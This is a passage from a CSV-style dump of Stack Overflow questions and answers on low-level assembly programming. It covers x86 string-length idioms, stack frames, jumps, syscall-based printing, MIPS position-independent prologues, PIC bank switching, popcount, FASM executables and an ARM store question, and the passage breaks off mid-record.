<p>The <code>-Wa</code> part passes it from the compiler driver to the assembler, much like <code>-Wl</code> passes arguments to the linker.</p>
","19342603"
"REPNZ SCAS Assembly Instruction Specifics","7777","","<p>I am trying to reverse engineer a binary and the following instruction is confusing me, can anyone clarify what exactly this does?</p>

<pre><code>=&gt;0x804854e:    repnz scas al,BYTE PTR es:[edi]
  0x8048550:    not    ecx
</code></pre>

<p>Where:</p>

<pre><code>EAX: 0x0
ECX: 0xffffffff
EDI: 0xbffff3dc (""aaaaaa\n"")
ZF:  1
</code></pre>

<p>I see that it is somehow decrementing ECX by 1 each iteration, and that EDI is incrementing along the length of the string.  I know it calculates the length of the string, but as far as exactly HOW it's happening, and why ""al"" is involved I'm not quite sure.</p>
","<p>I'll try to explain it by reversing the code back into C.</p>

<p>Intel's Instruction Set Reference (Volume 2 of <a href=""http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html"">Software Developer's Manual</a>) is invaluable for this kind of reverse engineering.</p>

<h2>REPNE SCASB</h2>

<p>The logic for REPNE and SCASB combined:</p>

<pre><code>while (ecx != 0) {
    temp = al - *(BYTE *)edi;
    SetStatusFlags(temp);
    if (DF == 0)   // DF = Direction Flag
        edi = edi + 1;
    else
        edi = edi - 1;
    ecx = ecx - 1;
    if (ZF == 1) break;
}
</code></pre>

<p>Or more simply:</p>

<pre><code>while (ecx != 0) {
    ZF = (al == *(BYTE *)edi);
    if (DF == 0)
        edi++;
    else
        edi--;
    ecx--;
    if (ZF) break;
}
</code></pre>

<h2>String Length</h2>

<p>However, the above is insufficient to explain how it computes the length of a string. Based on the presence of the <code>not ecx</code> in your question, I'm assuming the snippet belongs to this idiom (or similar) for computing string length using <code>REPNE SCASB</code>:</p>

<pre><code>sub ecx, ecx
sub al, al
not ecx
cld
repne scasb
not ecx
dec ecx
</code></pre>

<p>Translating to C and using our logic from the previous section, we get:</p>

<pre><code>ecx = (unsigned)-1;
al = 0;
DF = 0;
while (ecx != 0) {
    ZF = (al == *(BYTE *)edi);
    if (DF == 0)
        edi++;
    else
        edi--;
    ecx--;
    if (ZF) break;
}
ecx = ~ecx;
ecx--;
</code></pre>

<p>Simplifying using <code>al = 0</code> and <code>DF = 0</code>:</p>

<pre><code>ecx = (unsigned)-1;
while (ecx != 0) {
    ZF = (0 == *(BYTE *)edi);
    edi++;
    ecx--;
    if (ZF) break;
}
ecx = ~ecx;
ecx--;
</code></pre>

<p>Things to note:</p>

<ul>
<li>in two's complement notation, flipping the bits of <code>ecx</code> is equivalent to <code>-1 - ecx</code>.</li>
<li>in the loop, <code>ecx</code> is decremented before the loop breaks, so it decrements by <code>length(edi) + 1</code> in total.</li>
<li><code>ecx</code> can never be zero in the loop, since the string would have to occupy the entire address space.</li>
</ul>

<p>So after the loop above, <code>ecx</code> contains <code>-1 - (length(edi) + 1)</code> which is the same as <code>-(length(edi) + 2)</code>, which we flip the bits to give <code>length(edi) + 1</code>, and finally decrement to give <code>length(edi)</code>.</p>

<p>Or rearranging the loop and simplifying:</p>

<pre><code>const char *s = edi;
size_t c = (size_t)-1;      // c == -1
while (*s++ != '\0') c--;   // c == -1 - length(s)
c = ~c;                     // c == length(s)
</code></pre>

<p>And inverting the count:</p>

<pre><code>size_t c = 0;
while (*s++ != '\0') c++;
</code></pre>

<p>which is the <code>strlen</code> function from C:</p>

<pre><code>size_t strlen(const char *s) {
    size_t c = 0;
    while (*s++ != '\0') c++;
    return c;
}
</code></pre>
","26818873"
"Is the EBP register (base frame pointer) only for Debugging in x86?","7760","","<p>Learning x86 assembly and the frame pointer is blowing my mind a little. I learned from this <a href=""https://stackoverflow.com/questions/579262/what-is-the-purpose-of-the-frame-pointer"">SO question</a> that EBP makes life awesome for debugging.  That's great, but I was curious, ""What else is EBP used for?""  Looking at the <a href=""http://en.wikipedia.org/wiki/Call_stack#The_stack_and_frame_pointers"" rel=""nofollow noreferrer"">call stack</a> Wikipedia article, EBP is necessary for dynamic stack allocation.</p>

<p>As I've always been under the assumption that dynamic allocation goes on the heap. So, why would I want to use dynamic stack allocation - why isn't the heap good enough?  And, how is EBP useful for this?</p>
","<p>Allocating small amount of memory from stack is extremely fast compared to heap allocating. When we allocate memory from heap then we must call API or memory manager.</p>

<p><strong>YES</strong> you can use EBP register also for any other purpose like other 32bit registers but you must first to store its content and after that restore before you exit your procedure.</p>

<p>You can use <code>PUSH EBP</code> for storing the EBP content to the stack and <code>POP EBP</code> for restoring.</p>
","11253269"
"String in Assembly","7738","","<p>What does .string do in assembly?</p>

<p>In an inline <strong>asm</strong> call in c, I wrote</p>

<pre><code>.string \""Hello World\""
</code></pre>

<p>1) Can somebody give me an overview of how .string works?</p>

<p>2) Somehow that value gets saved in %esi. Why?</p>

<p>3) How can I append a return carriage on the end? \n doesn't work</p>
","<p><code>.string</code> is an assembler directive in GAS similar to <code>.long</code>, <code>.int</code>, or <code>.byte</code>. All it does is create and initialize memory for you to use in your program. In this case, the assembler is allocating space for 13 characters in 13 contiguous bytes of memory. If you were to look at the memory, you would see this:</p>

<pre><code>[""][H][e][l][l][o][ ][W][o][r][l][d][""]
</code></pre>

<p>Except in hexadecimal rather than characters. I'm not sure how or why <code>%esi</code> points to the string (it's either an assembler setting I'm not familiar with or has been set that way on a line of code you're not showing us). What it means is that <code>%esi</code> ""points"" to the first byte of the string - in this case the first <code>[""]</code>. You can use the <code>%esi</code> register to loop through the bytes using an offset (<code>%esi + 5</code> would be <code>[o]</code>) or by incrementing the register itself.</p>

<p>To add a newline you might want to try <code>\x0D\x0A</code> instead of <code>\n</code>.</p>
","7652527"
"SAR command in X86 assembly with one parameter","7732","","<p>In a disassembled program I'm analyzing, I found the command</p>

<pre><code>sar %eax
</code></pre>

<p>What does this do? I know that <code>sar</code> with two arguments performs a right shift, but I can't find what it means with only one parameter.</p>

<p>This program was compiled for an Intel x86 processor.</p>
","<p>Looks like the dissembler used short-hand for <code>SAR EAX,1</code> which has an opcode of <code>0xD1F8</code>. when the immediate is not 1, aka <code>SAR EAX,xx</code>, the opcode is <code>0xC1F8 xx</code>, see the Intel Instruction reference, Vol. 2B, 4-353.</p>
","12814154"
"Difference between long and short jump (x86)","7712","","<p>I've read that short jumps are to be used when <strong>the relative jump is less than 124 in address</strong>, and long jumps should be used otherwise.</p>

<p>What is the difference in terms of <em>operations performed in the CPU / performance</em> between the two types of jumps on x86?</p>
","<p>There are actually three types of <code>JMP</code> instructions; short, near and far (long).</p>

<p>A short <code>JMP</code> is the relative <code>JMP</code> that you refer to.  It is encoded as a two bytes; the actual <code>JMP</code> and the number of bytes +/- relative to the current IP.  </p>

<p>A near jump allows you to jump within the current ""segment"" (using real mode terms) or within the currently selected memory area in the CS selector.</p>

<p>A Long or Far <code>JMP</code> additionally includes a selector (or segment in real mode)</p>

<p>You can look up the timings for yourself.  The biggest difference related to time is caused by the different numbers of bytes that must be read to accomplish the <code>JMP</code>.</p>
","29316621"
"How to print a string to the terminal in x86-64 assembly (NASM) without syscall?","7706","","<p>I am new to assembly, and want to first try to get an intuitive feel for how printing a string to the terminal would work, without going through the operating system abstraction (Linux or OSX).</p>

<p><strong>tl;dr</strong> How do you write to stdout (print to the terminal) in x86-64 assembly with NASM on OSX, at the lowest level possible (i.e. without syscall)? How is BareMetal OS doing this?</p>

<p>Most examples show something like <a href=""http://cs.lmu.edu/~ray/notes/nasmexamples/"" rel=""nofollow noreferrer"">this</a>:</p>

<pre><code>global start

section .text
start:
  mov rax, 1
  mov rdi, 1
  mov rsi, message
  mov rdx, 13
  syscall

  mov eax, 60
  xor rdi, rdi
  syscall

message:
  db ""Hello world"", 10
</code></pre>

<p>In there, they are using <code>syscall</code> to print the string, which is <a href=""https://stackoverflow.com/questions/27592937/where-are-the-system-codes-coming-from-in-x86-64-assembly#comment43609669_27592971"">relying on the operating system</a>.  I am not looking for that, but for how to write a string to stdout directly, at the lowest level possible.</p>

<p>There is this exokernel project, <a href=""https://github.com/ReturnInfinity/BareMetal-OS"" rel=""nofollow noreferrer"">BareMetal OS</a> that I think is doing this. Though since I am new to assembly, I don't know enough yet to figure out how they accomplish this. From what it seems though, the two important files are:</p>

<ul>
<li><a href=""https://github.com/ReturnInfinity/BareMetal-OS/blob/master/os/syscalls/screen.asm"" rel=""nofollow noreferrer"">syscalls/screen.asm</a></li>
<li><a href=""https://github.com/ReturnInfinity/BareMetal-OS/blob/master/os/syscalls/string.asm"" rel=""nofollow noreferrer"">syscalls/string.asm</a></li>
</ul>

<p>It seems the relevant code to print is this (extracted from those two files):</p>

<pre><code>;
; Display text in terminal.
;
;  IN:  RSI = message location (zero-terminated string)
; OUT:  All registers preserved
;

os_output:
  push rcx

  call os_string_length
  call os_output_chars

  pop rcx
  ret

; 
; Displays text.
;
;  IN:  RSI = message location (an ASCII string, not zero-terminated)
; RCX = number of chars to print
; OUT:  All registers preserved
;

os_output_chars:
  push rdi
  push rsi
  push rcx
  push rax

  cld ; Clear the direction flag.. we want to increment through the string
  mov ah, 0x07 ; Store the attribute into AH so STOSW can be used later on

;
; Return length of a string.
;
;  IN:  RSI = string location
; OUT:  RCX = length (not including the NULL terminator)
;
; All other registers preserved
;

os_string_length:
  push rdi
  push rax

  xor ecx, ecx
  xor eax, eax
  mov rdi, rsi
  not rcx
  cld
  repne scasb ; compare byte at RDI to value in AL
  not rcx
  dec rcx

  pop rax
  pop rdi
  ret
</code></pre>

<p>But that doesn't look complete to me (though I wouldn't know yet since I'm new).</p>

<p>So my question is, along the lines of that BareMetal OS snippet, how do you write to stdout (print to the terminal) in x86-64 assembly with NASM on OSX?</p>
","<p>This is a good exercise. You will use <code>syscall</code> (you cannot access <code>stdout</code> otherwise), but you can do a ""bare-metal"" write without any external library providing the output routine (like calling <code>printf</code>). As an example of the basic ""bare-metal"" write to <code>stdout</code> in x86_64, I put together a example without any internal or system function calls:</p>

<pre><code>section .data
    string1 db  0xa, ""  Hello StackOverflow!!!"", 0xa, 0xa, 0

section .text
    global _start

    _start:
        ; calculate the length of string
        mov     rdi, string1        ; string1 to destination index
        xor     rcx, rcx            ; zero rcx
        not     rcx                 ; set rcx = -1
        xor     al,al               ; zero the al register (initialize to NUL)
        cld                         ; clear the direction flag
        repnz   scasb               ; get the string length (dec rcx through NUL)
        not     rcx                 ; rev all bits of negative results in absolute value
        dec     rcx                 ; -1 to skip the null-terminator, rcx contains length
        mov     rdx, rcx            ; put length in rdx
        ; write string to stdout
        mov     rsi, string1        ; string1 to source index
        mov     rax, 1              ; set write to command
        mov     rdi,rax             ; set destination index to rax (stdout)
        syscall                     ; call kernel

        ; exit 
        xor     rdi,rdi             ; zero rdi (rdi hold return value)
        mov     rax, 0x3c           ; set syscall number to 60 (0x3c hex)
        syscall                     ; call kernel

; Compile/Link
;
; nasm -f elf64 -o hello-stack_64.o hello-stack_64.asm
; ld  -o hello-stack_64 hello-stack_64.o
</code></pre>

<p><strong>output:</strong></p>

<pre><code>$ ./hello-stack_64

  Hello StackOverflow!!!
</code></pre>

<p>For general use, I split the process into two parts <strong>(1)</strong> getting the length and <strong>(2)</strong> writing to <code>stdout</code>. Below the <code>strprn</code> function will write any string to <code>stdout</code>. It calls <code>strsz</code> to get the length while preserving the destination index on the stack. This reduces the task of writing a string to <code>stdout</code> and prevents a lot of repitition in your code.</p>

<pre><code>; szstr computes the lenght of a string.
; rdi - string address
; rdx - contains string length (returned)
section .text
        strsz:
                xor     rcx, rcx                ; zero rcx
                not     rcx                     ; set rcx = -1 (uses bitwise id: ~x = -x-1)
                xor     al,al                   ; zero the al register (initialize to NUL)
                cld                             ; clear the direction flag
                repnz scasb                     ; get the string length (dec rcx through NUL)
                not     rcx                     ; rev all bits of negative -&gt; absolute value
                dec     rcx                     ; -1 to skip the null-term, rcx contains length
                mov     rdx, rcx                ; size returned in rdx, ready to call write
                ret

; strprn writes a string to the file descriptor.
; rdi - string address
; rdx - contains string length
section .text
        strprn:
                push    rdi                     ; push string address onto stack
                call    strsz                   ; call strsz to get length
                pop     rsi                     ; pop string to rsi (source index)
                mov     rax, 0x1                ; put write/stdout number in rax (both 1)
                mov     rdi, rax                ; set destination index to rax (stdout)
                syscall                         ; call kernel
                ret
</code></pre>

<p>To further automate general output to <code>stdout</code> NASM macros provide a convenient solution. Example <code>strn</code> (short for <code>string_n</code>). It takes two arguments, the addresses of the string, and the number of characters to write:</p>

<pre><code>%macro  strn    2
        mov     rax, 1
        mov     rdi, 1
        mov     rsi, %1
        mov     rdx, %2
        syscall
%endmacro
</code></pre>

<p>Useful for indents, newlines or writing complete strings. You could generalize further by passing 3 arguments including the destination for <code>rdi</code>.</p>
","27594733"
"How to test characters in a string [Assembly]","7706","","<p>I'm writing a program to search for vowels inside a string, but I'm having trouble testing the individual characters inside the string, I have the basic concept down and I've done this before using C++ and Python, but I don't know how to code it in Assembly.</p>

<p>I'm going to use a switch to add up and test the individual characters, and I know that I need to use a loop to cycle through all the characters, but I'm stuck on actually testing individual characters. (this isn't what I have coded per say but an illustrative example)</p>

<pre><code>max_length     dd      40
user_input     resd    max_length
str_len        dw      $ - user_input
GetStr         user_input             ; ""I am a boy""
mov            ecx, str_len
</code></pre>

<p>And this is where I get stuck. How would you test the individual characters of <code>user_input</code> ? </p>

<p>In C++ you would have something like <code>if(user_input[0] = 'Y')</code>, but how do I translate that type of instruction to assembly (user_input[0])</p>

<p>I understand that it does not work this way in assembly but hopefully this will clear some things up.</p>

<pre><code>str_len DW      $ - user_input
max_length      EQU  40

jump_table:   
        DD      case_0
        DD      case_1
        DD      case_2
        DD      case_3
        DD      case_4
        DD      case_5

.UDATA

user_input    resd      max_length


_main:
    push    ebp
    mov     ebp, esp

switch:    
    xor     eax,eax
    xor     ebx,ebx
    PutStr  prompt
    GetStr   user_input
    mov     ecx, [str_len]
    mov     esi, user_input

read:    
    mov     al, byte [esi+ebx]
    or      al, 20h
    cmp     al, 'a'
    je      [jump_table]
    cmp     al, 'e'
    je      [jump_table+4]
    cmp     al, 'i'
    je      [jump_table+8]
    cmp     al, 'o'
    je      [jump_table+12]
    cmp     al, 'u'
    je      [jump_table+16]
    cmp     ecx, 0
    je      [jump_table+20]
    inc     ebx
    jmp     read
</code></pre>

<p>this is where I am now, as I commented further down I'm getting an error linked to <code>str_len</code></p>

<p>This is all working, I just need to clear the buffer, Thanks!
    str_len         DD       40 
    max_length      EQU      40</p>

<pre><code>jump_table:   
        DD      case_0
        DD      case_1
        DD      case_2
        DD      case_3
        DD      case_4
        DD      case_5

.UDATA

user_input    resb      max_length

.CODE

.STARTUP

switch:    
    xor     eax,eax
    xor     ebx,ebx
    xor     esi, esi
    PutStr  prompt
    GetStr  user_input
    mov     ecx, [str_len]
    mov     esi, user_input

read:    
    mov     al, byte [esi+ebx]
    or      al, 20h
    ;PutCh   al
    cmp     al, 'a'
    je      vowel_A
    cmp     al, 'e'
    je      vowel_E
    cmp     al, 'i'
    je      vowel_I
    cmp     al, 'o'
    je      vowel_O
    cmp     al, 'u'
    je      vowel_U
    cmp     ecx, 0
    je      str_end
    inc     ebx
    dec     ecx
    jmp     read
</code></pre>
","<p><code>mov EAX, [user_input]</code> would NOT load the string into <code>eax</code> but the first 4 bytes of the string.</p>

<p><code>user_input</code> is a pointer.</p>

<pre><code>    mov     esi, user_input
    xor     ebx, ebx
SearchForVowel:
    mov     al, byte [esi + ebx]
    test    al, al          ; does al contain a 0
    jz      .Done           ; yes we are done.

    ; check to see if al contains a vowel
    if al does not contain a vowel, jump to NoVowel
    otherwise, increment vowel_counter

.NoVowel:
    inc     ebx
    jmp     SearchForVowel

.Done:
</code></pre>

<p>No need to store the string length since strings <strong>should</strong> be NULL terminated.</p>
","20039294"
"MIPS stack frame (and ""addiu"" instruction confusion)","7699","","<p>I'm new to MIPS and am trying to understand the disassembly of a function.<br>
(EDIT: it is dynamically linked to /lib/ld-uClib.so.0 and uses some usual libc functions, so I assume it was written in C using the uClibc toolchain, and should therefore have that calling procedure and stack frame, etc.).</p>

<p>At the start of the function it does  </p>

<pre><code>00400824 &lt;practice_crackme&gt;:
  400824:   3c1c0fc0    lui gp,0xfc0        ; ???
  400828:   279c673c    addiu   gp,gp,26428 ; ???
  40082c:   0399e021    addu    gp,gp,t9    ; ???

  400830:   27bd8020    addiu   sp,sp,-32736  ; sp -= 0x7fe0 (-32736=0xffff8020)
  400834:   34038670    li  v1,0x8670
  400838:   afbf7fdc    sw  ra,32732(sp)
  40083c:   afbe7fd8    sw  s8,32728(sp)
  400840:   afb77fd4    sw  s7,32724(sp)
  400844:   afb67fd0    sw  s6,32720(sp)
  400848:   afb57fcc    sw  s5,32716(sp)
  40084c:   afb47fc8    sw  s4,32712(sp)
  400850:   afb37fc4    sw  s3,32708(sp)
  400854:   afb27fc0    sw  s2,32704(sp)
  400858:   afb17fbc    sw  s1,32700(sp)
  40085c:   afb07fb8    sw  s0,32696(sp)
  400860:   03a3e823    subu    sp,sp,v1  ; sp-=0x8670 (local space=0x8670 bytes)
  400864:   afbc0018    sw  gp,24(sp)
</code></pre>

<p>Then at the end of the function it does:  </p>

<pre><code>  4009e0:   8fbc0018    lw  gp,24(sp)
  4009e4:   34088670    li  t0,0x8670
  4009e8:   03a8e821    addu    sp,sp,t0    ; sp+=0x8670; //remove local space
  4009ec:   8fbf7fdc    lw  ra,32732(sp)
  4009f0:   8fbe7fd8    lw  s8,32728(sp)
  4009f4:   8fb77fd4    lw  s7,32724(sp)
  4009f8:   8fb67fd0    lw  s6,32720(sp)
  4009fc:   8fb57fcc    lw  s5,32716(sp)
  400a00:   8fb47fc8    lw  s4,32712(sp)
  400a04:   8fb37fc4    lw  s3,32708(sp)
  400a08:   8fb27fc0    lw  s2,32704(sp)
  400a0c:   8fb17fbc    lw  s1,32700(sp)
  400a10:   8fb07fb8    lw  s0,32696(sp)
  400a14:   03e00008    jr  ra
  400a18:   27bd7fe0    addiu   sp,sp,32736 ; sp += 0x7fe0
</code></pre>

<p>Question #1:<br>
Despite searching around for awhile on the internet, I still don't really understand how gp is supposed to be used in the stackframe.  </p>

<p>In particular, the documents I read say the call procedure standard is a0-a3 are used as function input, v0-v3 as function output, s0-s8 are preserved across calls, and t0-t9 are not preserved across any call.  So the pushing and popping of s0-s8 make sense.  <em>But why in the world is it setting gp according to the value in t9!?</em></p>

<p>Question #2:<br>
I don't understand why it moves the stack pointer twice.  It seems to reserve local space twice.</p>

<p>And on top of that, the addiu instruction is being disassembled with a <em>negative</em> number which doesn't make sense since the 'u' means unsigned, however the code doesn't make sense unless I actually consider it a negative number.  I double checked the opcode by looking it up at en.wikipedia.org/wiki/MIPS_architecture.  And it is indeed ""addiu"" and not ""addi"".  I'm so confused here.</p>
","<p>The first three instructions are for supporting <em>Position Independent Code</em>. See <a href=""http://www.linux-mips.org/wiki/PIC_code"" rel=""nofollow"">this linux-mips page</a> for an excellent explanation of PIC on MIPS. <code>t9</code> holds the address of the function, which can change every time you load a library supporting PIC, and that value is added to a constant already in <code>gp</code>. Similar to x86's:</p>

<pre><code>call __i686.get_pc_thunk.bx
add $0x1b88, %ebx
</code></pre>

<p>Where <code>__i686.get_pc_thunk.bx</code> loads <code>%ebx</code> with the address of the next instruction, and the subsequent add converts <code>%ebx</code> into a point of reference that will be used to access global symbols.</p>

<p><strong>ADDIU:</strong>
The only difference between signed and unsigned addition on MIPS is that signed addition can raise an overflow exception, so <code>ADDIU</code> is used instead to avoid that.</p>

<p><strong>Several stack adjustments:</strong> These probably relate to the fact that MIPS uses 16-bit immediates, so cannot always adjust the stack in one <code>ADDIU</code>.</p>
","6836242"
"Bank switching in PIC assembler","7694","","<p>I'm getting confused by bank switching in PIC assembler... This works for putting a 'Q' on the usart:</p>

<pre><code>bsf PORTB,1         ;Set Transmit DIR (PORTB (0x6) not mirrored in other banks)
movlw 'Q'           ;'Q' to work reg
movwf TXREG         ;work reg to TXREG (TXREG (0x19) not mirrored in other banks)
clrwdt              ;Clear watchdog
btfss TXSTA,TRMT    ;Wait until 'Q' is shifted (TXSTA is 0x18, not mirrored)
goto $-2
bcf PORTB,1         ;Set Recive DIR
</code></pre>

<p>And this works just as good:</p>

<pre><code>BCF 0x3, 0x5        ;Switch to bank 0
BCF 0x3, 0x6
bsf PORTB,1         ;Set Transmit DIR
movlw 'Q'           ;'Q' to work reg
movwf TXREG         ;work reg to TXREG 
BSF 0x3, 0x5        ;Switch to bank 1
clrwdt              ;Clear watchdog
btfss TXSTA,TRMT    ;Wait until 'Q' is shifted
goto $-2
BCF 0x3, 0x5        ;Switch to bank 0
bcf PORTB,1         ;Set Recive DIR
</code></pre>

<p>I have checked that the compiler does not do any bank switching when I'm not watching... When do HAVE to switch bank?</p>
","<p>First off which pic device are you using because that does make a slight difference.
Also which compiler are you using.</p>

<p>However the reason your code works is because everything you need to do to tx to the uart is in bank 0. Your writes to port b are doing nothing I am guessing that you want to switch the trisb and that is in bank 1 but since the uart has control of the pins writing to port B it self has no effect. In your second example you are polling what you think is TXSTA but that is in bank 0 not bank 1.  I am guessing that you get lucky by polling wrong location and the bit is always in the correct state so the loop terminates.</p>

<p>When I do a transmit I prefer to first see if the uart is empty and wait until it is and then send the char. No need to wait for it to finish transmitting unless you want to use an interupt for example to get the next char.</p>

<p>So both pieces of code work because you are in bank 0 in both when you do movwf TXREG. The rest is handled in hardware for you.</p>

<p>Edit:
Now that I know the part you are correct in that TXSTA is in bank 1. You through me because you had a comment of the address as 0x18 and it should be 0x98.  In the first example you are polling RCSTA bit 1 which is the OERR not TXSTA.  So if it is working this implies that OERR=1 which is very possible I usually clear it when I do anything with the receive.</p>
","840424"
"Bit popcount for large buffer, assembly preferred","7694","","<p>I'm looking for the fastest way to popcount on large buffer of 512 or more bytes. I can guarantee any required alignment, and the buffer size is always a power of 2. The buffer corresponds to block allocations, so typically the bits are either all set, none set, or mostly set favoring the ""left"" of the buffer, with occasional holes.</p>

<p>Some solutions I've considered are:</p>

<ul>
<li>GCC's <a href=""http://gcc.gnu.org/onlinedocs/gcc/Other-Builtins.html"" rel=""nofollow noreferrer""><code>__builtin_popcount</code></a></li>
<li><a href=""http://www.dalkescientific.com/writings/diary/archive/2008/07/05/bitslice_and_popcount.html"" rel=""nofollow noreferrer"">Bitslice <code>popcount_24words</code></a></li>
<li><a href=""http://graphics.stanford.edu/~seander/bithacks.html#CountBitsSetKernighan"" rel=""nofollow noreferrer"">Counting bits set, Brian Kernighan's way</a></li>
</ul>

<p>I'm interested in the fastest solution, it must work on 32bit x86 chipset belonging to core2 or more recent. SSE and SIMD are of great interest. I'll be testing on the following quad core CPU:</p>

<pre><code>matt@stanley:~/anacrolix/public/stackoverflow$ cat /proc/cpuinfo 
processor       : 0
vendor_id       : GenuineIntel
cpu family      : 6
model           : 15
model name      : Intel(R) Core(TM)2 Quad CPU    Q6600  @ 2.40GHz
stepping        : 11
cpu MHz         : 1600.000
cache size      : 4096 KB
physical id     : 0
siblings        : 4
core id         : 0
cpu cores       : 4
apicid          : 0
initial apicid  : 0
fdiv_bug        : no
hlt_bug         : no
f00f_bug        : no
coma_bug        : no
fpu             : yes
fpu_exception   : yes
cpuid level     : 10
wp              : yes
flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe nx lm constant_tsc arch_perfmon pebs bts aperfmperf pni dtes64 monitor ds_cpl vmx est tm2 ssse3 cx16 xtpr pdcm lahf_lm tpr_shadow vnmi flexpriority
bogomips        : 4800.21
clflush size    : 64
cache_alignment : 64
address sizes   : 36 bits physical, 48 bits virtual
power management:
</code></pre>
","<p>I outline the best C/assembly functions I found for <a href=""http://en.wikipedia.org/wiki/Hamming_weight"" rel=""nofollow"">population count/Hamming weight</a> of large buffers below.</p>

<p>The fastest assembly function is <a href=""http://wm.ite.pl/snippets/asm/ssse3_popcount.c"" rel=""nofollow""><code>ssse3_popcount3</code></a>, described <a href=""http://wm.ite.pl/articles/sse-popcount.html"" rel=""nofollow"">here</a>. It requires <a href=""http://en.wikipedia.org/wiki/SSSE3"" rel=""nofollow"">SSSE3</a>, available on Intel Core 2 and later, and AMD chipsets arriving in 2011. It uses <a href=""http://en.wikipedia.org/wiki/SIMD"" rel=""nofollow"">SIMD</a> instructions to popcount in 16 byte chunks and unrolls 4 loop iterations at a time.</p>

<p>The fastest C function is <a href=""http://dalkescientific.com/writings/diary/popcnt.c"" rel=""nofollow""><code>popcount_24words</code></a>, described <a href=""http://www.dalkescientific.com/writings/diary/archive/2008/07/05/bitslice_and_popcount.html"" rel=""nofollow"">here</a>. It uses the bit-slicing algorithm. Of note I found that <a href=""http://clang.llvm.org/"" rel=""nofollow"">clang</a> could actually generate appropriate vector assembly instructions, which gave impressive performance increases. This aside, the algorithm is still extremely fast.</p>
","5067023"
"FASM HelloWorld .exe program","7680","","<p>I tried to write my first .exe program on FASM. It works ok when I use org 100h, but I want to compile .exe file. When I replaced first line with ""format PE GUI 4.0"" and tried to compile it the error occured: ""value out of range"" (line: mov dx,msg).</p>

<pre><code>ORG 100h      ;format PE GUI 4.0

mov dx,msg
mov ah,9h
int 21h

mov ah,10h
int 16h

int 21h

msg db ""Hello World!$"" 
</code></pre>

<p>How should I change the source code?
<br>----------------------------------------------<br>
The answer is:</p>

<pre><code>format mz
org 100h

mov edx,msg
mov ah,9h
int 21h

mov ah,10h
int 16h

mov ax,$4c01
int 21h

msg db ""Hello World!$"" 
</code></pre>
","<p>Your first version is in COM format. It is a 16-bit real mode FLAT model.
Your second version is in DOS MZ format. It is a 16-bit real mode SEGMENTED model.</p>

<p>Segmented model uses ""segments"" to describe your DS (segment) and DX (offset). So firstly you need to define segments for your data and code, and secondly you need to point correctly where is your data segment and what is your offset before you can use the int 21h, function 9.</p>

<p><strong>int 21h, function 9 needs a DS:DX to be setup correctly in segmented model, to print a null terminated string</strong></p>

<pre><code>format MZ
entry .code:start
segment .code
start:
mov ax, .data ; put data segment into ax
mov ds, ax    ; there, I setup the DS for you
mov dx, msg   ; now I give you the offset in DX. DS:DX now completed.
mov ah, 9h
int 21h
mov ah, 4ch
int 21h
segment .data
msg db 'Hello World', '$'
</code></pre>

<p>Hope this helps some FASM newbies out there. </p>
","5094114"
"NASM: Count how many bits in a 32 Bit number are set to 1","7680","","<p>I have a 32 Bit number and want to count know how many bits are 1.</p>

<p>I'm thinking of this pseudocode:</p>

<pre><code>mov eax, [number]
while(eax != 0)
{
  div eax, 2
  if(edx == 1)
  {
   ecx++;
  } 
  shr eax, 1
}
</code></pre>

<p>Is there a more efficient way? </p>

<p>I'm using NASM on a x86 processor.</p>

<p>(I'm just beginning with assembler, so please do not tell me to use code from extern libraries, because I do not even know how to include them ;) )</p>

<p>(I just found <a href=""https://stackoverflow.com/questions/109023/best-algorithm-to-count-the-number-of-set-bits-in-a-32-bit-integer"">How to count the number of set bits in a 32-bit integer?</a> which also contains my solution. There are other solutions posted, but unfortunatly I can't seem to figure out, how I would write them in assembler)</p>
","<p>The most efficient way (in terms of execution time, anyway) is to have a lookup table.  Obviously you're not going to have a 4-billion entry table, but you could break the 32 bits down into 8-bit chunks and only need a 256-entry table, or further down into 4-bit chunks and only need 16 entries.  Good luck!</p>
","2931521"
"Use the floating point instructions to get results in decimal","7670","","<p>Hi I'm coding a small program in MIPS that divide 2 between 9 and show the result.This is the code</p>

<pre><code>li $t1, 2
li $t2, 9
li $v0, 2
div $t0,$t2,$t1
move $a0,$t0
syscall
</code></pre>

<p>(this is not the full code, just the section handling division)</p>

<p>So, 2 / 9 is 0.2222222222222222</p>

<p>But when I run it I only get 0.0</p>

<p>How I show the true result (0.2222222222222222)?</p>

<p>I've been said that I'm using integer instead of floating point, that I must use the floating point instructions to get results in decimal. That I should look up the div.x instruction, but div.x is not a recognized operator.</p>

<p>So, I'm pretty much in blank. I don't understand what to do.</p>

<p>Could someone post the code to show the floating point result?</p>

<p>Thanks in advance.</p>
","<p>Ok, after a long try and mistake the right way to print the true result is:</p>

<p>Set 2 floating points registers using pseudo li.s (Thanks to Paul R for point me in the right direction)</p>

<pre><code>li.s $f1, 2.0
li.s $f2, 9.0
</code></pre>

<p>Obviously, prepare to print a float</p>

<pre><code>li $v0, 2
</code></pre>

<p>At division instead of <code>div $t0,$t2,$t1</code> I should use</p>

<pre><code>div.s $f12,$f1,$f2
</code></pre>

<p>and instead of <code>move $a0,$t0</code> I should just</p>

<pre><code>syscall
</code></pre>

<p>There is no need to move, div.s prints outs the result at once so there is no real need to move the contents of $f12 into $a0 for print its content.</p>

<p>It's a real shame that mars doesn't implment the pseudo li.s. I had to try this on PCSPIM...</p>

<p>The final code is</p>

<pre><code>.globl main
.text
main:
li.s $f1, 2.0
li.s $f2, 9.0
li $v0, 2
div.s $f12,$f1,$f2
syscall
li $v0, 10
syscall
</code></pre>

<p>When you run it you'll get 0.22222222, the true result of dividing 2 between 9.</p>
","6540085"
"ARM assembly: auto-increment register on store","7666","","<p>Is it possible to auto-increment the base address of a register on a STR with a <code>[Rn]!</code>? I've peered through the documentation but haven't been able to find a definitive answer, mainly because the command syntax is presented for both LDR and STR - in theory it should work for both, but I couldn't find any examples of auto-incrementing on a store (the loading works ok).</p>

<p>I've made a small program which stores two numbers in a vector. When it's done the contents of <code>out</code> should be <code>{1, 2}</code> but the store overwrites the first byte, as if the auto-increment isn't working.</p>

<pre><code>#include &lt;stdio.h&gt;

int main()
{
        int out[]={0, 0};
        asm volatile (
        ""mov    r0, #1          \n\t""
        ""str    r0, [%0]!       \n\t""
        ""add    r0, r0, #1      \n\t""
        ""str    r0, [%0]        \n\t""
        :: ""r""(out)
        : ""r0"" );
        printf(""%d %d\n"", out[0], out[1]);
        return 0;
}
</code></pre>

<hr>

<p>EDIT: 
